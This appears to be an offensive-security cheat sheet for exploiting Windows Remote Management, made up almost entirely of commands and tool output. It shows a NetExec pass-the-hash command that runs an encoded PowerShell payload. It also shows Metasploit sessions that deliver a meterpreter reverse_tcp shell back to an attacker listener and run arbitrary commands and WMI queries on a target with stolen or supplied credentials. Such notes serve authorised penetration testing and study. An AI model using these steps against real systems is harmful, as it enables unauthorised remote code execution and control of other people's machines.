# WinRM

## 01 - Manual

### 1.1 - NetExec

```
$ netexec winrm <IP> -u "<username>" -H <nt_hash> [-d <domain> | --local-auth] -x "powershell -E <base64_payload>"
```

## 02 - Metasploit

### 2.1 - WinRM Script Exec

```
msf > use exploit/windows/winrm/winrm_script_exec

msf exploit(windows/winrm/winrm_script_exec) > set payload windows/x64/meterpreter/reverse_tcp

msf exploit(windows/winrm/winrm_script_exec) > options

Module options (exploit/windows/winrm/winrm_script_exec):  
  
  Name       Current Setting  Required  Description  
  ----       ---------------  --------  -----------  
  DOMAIN     WORKSTATION      yes       The domain to use for Windows authentication  
  FORCE_VBS  false            yes       Force the module to use the VBS CmdStager  
  PASSWORD                    no        A specific password to authenticate with  
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]  
  RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html  
  RPORT      5985             yes       The target port (TCP)  
  SSL        false            no        Negotiate SSL/TLS for outgoing connections  
  SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)  
  URI        /wsman           yes       The URI of the WinRM service  
  URIPATH                     no        The URI to use for this exploit (default is random)  
  USERNAME                    no        A specific username to authenticate as  
  VHOST                       no        HTTP server virtual host  
  
  
  When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:  
  
  Name     Current Setting  Required  Description  
  ----     ---------------  --------  -----------  
  SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.  
  SRVPORT  8080             yes       The local port to listen on.  
  
  
Payload options (windows/x64/meterpreter/reverse_tcp):  
  
  Name      Current Setting  Required  Description  
  ----      ---------------  --------  -----------  
  EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)  
  LHOST                      yes       The listen address (an interface may be specified)  
  LPORT     4444             yes       The listen port  
  
  
Exploit target:  
  
  Id  Name  
  --  ----  
  0   Windows  
  
  
  
View the full module info with the info, or info -d command.

msf exploit(windows/winrm/winrm_script_exec) > set domain <domain>

msf exploit(windows/winrm/winrm_script_exec) > set USERNAME <username>

msf exploit(windows/winrm/winrm_script_exec) > set password <password>

msf exploit(windows/winrm/winrm_script_exec) > set rhosts <target_IP>

msf exploit(windows/winrm/winrm_script_exec) > run
```

### 2.2 - WinRM Commands

```
msf > use auxiliary/scanner/winrm/winrm_cmd

msf auxiliary(scanner/winrm/winrm_cmd) > options

Module options (auxiliary/scanner/winrm/winrm_cmd):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   CMD       ipconfig /all    yes       The windows command to run
   DOMAIN    WORKSTATION      yes       The domain to use for Windows authentication
   PASSWORD                   no        A specific password to authenticate with
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT     5985             yes       The target port (TCP)
   SSL       false            no        Negotiate SSL/TLS for outgoing connections
   THREADS   1                yes       The number of concurrent threads (max one per host)
   URI       /wsman           yes       The URI of the WinRM service
   USERNAME                   yes       The username to authenticate as
   VHOST                      no        HTTP server virtual host


View the full module info with the info, or info -d command.

msf auxiliary(scanner/winrm/winrm_cmd) > set username <username>

msf auxiliary(scanner/winrm/winrm_cmd) > set password <password>

msf auxiliary(scanner/winrm/winrm_cmd) > set domain <domain>

msf auxiliary(scanner/winrm/winrm_cmd) > set rhosts <IP>

msf auxiliary(scanner/winrm/winrm_cmd) > set rport <PORT>

msf auxiliary(scanner/winrm/winrm_cmd) > run
```

### 2.3 - WinRM WQL

```
msf > use auxiliary/scanner/winrm/winrm_wql

msf auxiliary(scanner/winrm/winrm_wql) > options

Module options (auxiliary/scanner/winrm/winrm_wql):

   Name       Current Setting                        Required  Description
   ----       ---------------                        --------  -----------
   DOMAIN     WORKSTATION                            yes       The domain to use for Windows authentication
   NAMESPACE  root/cimv2                             yes       The WMI namespace to use for queries
   PASSWORD                                          no        A specific password to authenticate with
   Proxies                                           no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                                            yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      5985                                   yes       The target port (TCP)
   SSL        false                                  no        Negotiate SSL/TLS for outgoing connections
   THREADS    1                                      yes       The number of concurrent threads (max one per host)
   URI        /wsman                                 yes       The URI of the WinRM service
   USERNAME                                          no        A specific username to authenticate as
   VHOST                                             no        HTTP server virtual host
   WQL        Select Name,Status from Win32_Service  yes       The WQL query to run


View the full module info with the info, or info -d command.

msf auxiliary(scanner/winrm/winrm_wql) > set wql <query>

msf auxiliary(scanner/winrm/winrm_wql) > set namespace <namespace>

msf auxiliary(scanner/winrm/winrm_wql) > set username <username>

msf auxiliary(scanner/winrm/winrm_wql) > set password <password>

msf auxiliary(scanner/winrm/winrm_wql) > set domain <domain>

msf auxiliary(scanner/winrm/winrm_wql) > set rhosts <IP>

msf auxiliary(scanner/winrm/winrm_wql) > set rport <PORT>

msf auxiliary(scanner/winrm/winrm_wql) > run
```